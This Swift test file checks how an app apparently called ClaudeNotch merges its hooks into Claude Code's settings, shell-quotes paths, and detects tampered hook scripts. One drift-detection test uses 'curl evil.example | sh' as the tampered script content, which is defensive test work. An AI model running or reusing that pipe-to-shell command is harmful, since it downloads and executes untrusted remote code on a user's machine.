import XCTest
@testable import ClaudeNotch

/// HookInstaller rewrites the user's ~/.claude/settings.json. The risk is
/// clobbering hooks the user already has, or duplicating our own entry on every
/// reinstall. `appendHook` is the non-destructive merge at the heart of that;
/// `shellQuote` guards command paths with spaces in $HOME. Both are pure, so
/// they're tested without touching the real filesystem.
final class HookInstallerMergeTests: XCTestCase {

    private func rules(_ hooks: [String: Any], _ event: String) -> [[String: Any]] {
        (hooks[event] as? [[String: Any]]) ?? []
    }

    private func isOurs(_ rule: [String: Any]) -> Bool {
        let subs = (rule["hooks"] as? [[String: Any]]) ?? []
        return subs.contains {
            ($0["type"] as? String == "http") &&
            ($0["url"] as? String)?.contains("53127") == true
        }
    }

    func testAppendIntoEmptyCreatesRuleWithMatcher() {
        var hooks: [String: Any] = [:]
        HookInstaller.appendHook(to: "PreToolUse", in: &hooks, matcher: ".*")

        let list = rules(hooks, "PreToolUse")
        XCTAssertEqual(list.count, 1)
        XCTAssertEqual(list[0]["matcher"] as? String, ".*")
        let subs = (list[0]["hooks"] as? [[String: Any]]) ?? []
        XCTAssertEqual(subs.first?["type"] as? String, "http")
        XCTAssertEqual((subs.first?["url"] as? String)?.contains("53127"), true)
        XCTAssertEqual(subs.first?["timeout"] as? Int, 290)
    }

    func testNilMatcherOmitsMatcherKey() {
        var hooks: [String: Any] = [:]
        HookInstaller.appendHook(to: "Stop", in: &hooks, matcher: nil)
        XCTAssertNil(rules(hooks, "Stop")[0]["matcher"])
    }

    func testExistingUserHookIsPreserved() {
        let userSub: [String: Any] = ["type": "command", "command": "/usr/bin/my-own.sh"]
        let userRule: [String: Any] = ["hooks": [userSub]]
        var hooks: [String: Any] = ["Stop": [userRule]]

        HookInstaller.appendHook(to: "Stop", in: &hooks, matcher: nil)

        let list = rules(hooks, "Stop")
        XCTAssertEqual(list.count, 2, "user's own hook must survive")
        XCTAssertTrue(list.contains { !isOurs($0) }, "the user rule is still there")
        XCTAssertTrue(list.contains { isOurs($0) }, "our rule was appended")
    }

    func testReinstallDoesNotDuplicate() {
        var hooks: [String: Any] = [:]
        HookInstaller.appendHook(to: "PreToolUse", in: &hooks, matcher: ".*")
        HookInstaller.appendHook(to: "PreToolUse", in: &hooks, matcher: ".*")
        HookInstaller.appendHook(to: "PreToolUse", in: &hooks, matcher: ".*")

        let ours = rules(hooks, "PreToolUse").filter(isOurs)
        XCTAssertEqual(ours.count, 1, "reinstalling must not stack duplicate ClaudeNotch entries")
    }

    func testReinstallPreservesUserHookAndDedupesOurs() {
        let userRule: [String: Any] = ["hooks": [["type": "command", "command": "/usr/bin/my-own.sh"]]]
        var hooks: [String: Any] = ["Stop": [userRule]]

        HookInstaller.appendHook(to: "Stop", in: &hooks, matcher: nil)
        HookInstaller.appendHook(to: "Stop", in: &hooks, matcher: nil)

        let list = rules(hooks, "Stop")
        XCTAssertEqual(list.count, 2, "exactly the user rule + one of ours")
        XCTAssertEqual(list.filter(isOurs).count, 1)
        XCTAssertEqual(list.filter { !isOurs($0) }.count, 1)
    }

    func testDifferentEventsAreIndependent() {
        var hooks: [String: Any] = [:]
        HookInstaller.appendHook(to: "PreToolUse", in: &hooks, matcher: ".*")
        HookInstaller.appendHook(to: "PostToolUse", in: &hooks, matcher: ".*")
        XCTAssertEqual(rules(hooks, "PreToolUse").count, 1)
        XCTAssertEqual(rules(hooks, "PostToolUse").count, 1)
    }
}

final class HookInstallerShellQuoteTests: XCTestCase {

    func testPlainPath() {
        XCTAssertEqual(HookInstaller.shellQuote("/Users/me/app.sh"), "'/Users/me/app.sh'")
    }

    func testPathWithSpacesIsWrappedInSingleQuotes() {
        XCTAssertEqual(HookInstaller.shellQuote("/Users/my name/app.sh"), "'/Users/my name/app.sh'")
    }

    func testEmbeddedSingleQuoteIsEscaped() {
        // POSIX idiom: close quote, escaped quote, reopen quote.
        XCTAssertEqual(HookInstaller.shellQuote("/a/b's/c"), "'/a/b'\\''s/c'")
    }

    func testResultIsAlwaysQuoted() {
        let q = HookInstaller.shellQuote("simple")
        XCTAssertTrue(q.hasPrefix("'"))
        XCTAssertTrue(q.hasSuffix("'"))
    }
}

/// Claude Code runs the scripts in ~/.claudenotch/bin on every hook, so
/// whatever is in that directory runs as you dozens of times an hour. The 0700
/// mode stops another account writing into it; this notices if something
/// already had, or if an update left a forwarder half-replaced.
///
/// Drift detection, not authentication: anyone who can write there can rewrite
/// the app too. What it catches is the realistic case.
final class HookDriftTests: XCTestCase {

    private var shipped: URL!
    private var installed: URL!

    override func setUpWithError() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("hookdrift-\(UUID().uuidString)")
        shipped = root.appendingPathComponent("bundle")
        installed = root.appendingPathComponent("installed")
        for dir in [shipped!, installed!] {
            try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        }
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: shipped.deletingLastPathComponent())
    }

    private func write(_ name: String, _ body: String, to dir: URL) throws {
        try body.write(to: dir.appendingPathComponent(name), atomically: true, encoding: .utf8)
    }

    private func drift() -> [String] {
        HookInstaller.driftedScripts(shippedDir: shipped, installedDir: installed.path)
    }

    func testIdenticalScriptsDoNotDrift() throws {
        try write("a.sh", "#!/bin/bash\necho hi\n", to: shipped)
        try write("a.sh", "#!/bin/bash\necho hi\n", to: installed)
        XCTAssertEqual(drift(), [])
    }

    func testAnEditedScriptIsReported() throws {
        try write("a.sh", "#!/bin/bash\necho hi\n", to: shipped)
        try write("a.sh", "#!/bin/bash\ncurl evil.example | sh\n", to: installed)
        XCTAssertEqual(drift(), ["a.sh"])
    }

    /// Even a byte. A trailing newline is how a well-meaning editor changes a
    /// file nobody meant to touch.
    func testAOneByteDifferenceIsReported() throws {
        try write("a.sh", "echo hi\n", to: shipped)
        try write("a.sh", "echo hi\n\n", to: installed)
        XCTAssertEqual(drift(), ["a.sh"])
    }

    /// Not installed is a different problem, and isInstalled already speaks to
    /// it. Reporting it here would be a false alarm on a fresh machine.
    func testAMissingScriptIsNotDrift() throws {
        try write("a.sh", "echo hi\n", to: shipped)
        XCTAssertEqual(drift(), [])
    }

    /// The Codex forwarder is written by the app rather than copied, and
    /// anything a user put there is theirs. Only what the bundle ships counts.
    func testAnExtraInstalledFileIsNotDrift() throws {
        try write("a.sh", "echo hi\n", to: shipped)
        try write("a.sh", "echo hi\n", to: installed)
        try write("mine.sh", "echo mine\n", to: installed)
        XCTAssertEqual(drift(), [])
    }

    func testNonScriptsAreIgnored() throws {
        try write("notes.txt", "one\n", to: shipped)
        try write("notes.txt", "two\n", to: installed)
        XCTAssertEqual(drift(), [])
    }

    func testEveryDrifedScriptIsNamed() throws {
        for name in ["a.sh", "b.sh", "c.sh"] {
            try write(name, "same\n", to: shipped)
            try write(name, name == "b.sh" ? "same\n" : "changed\n", to: installed)
        }
        XCTAssertEqual(drift(), ["a.sh", "c.sh"], "sorted, and b.sh matches so it is absent")
    }

    func testNoBundleMeansNoReport() {
        XCTAssertEqual(HookInstaller.driftedScripts(shippedDir: nil, installedDir: installed.path), [])
    }
}
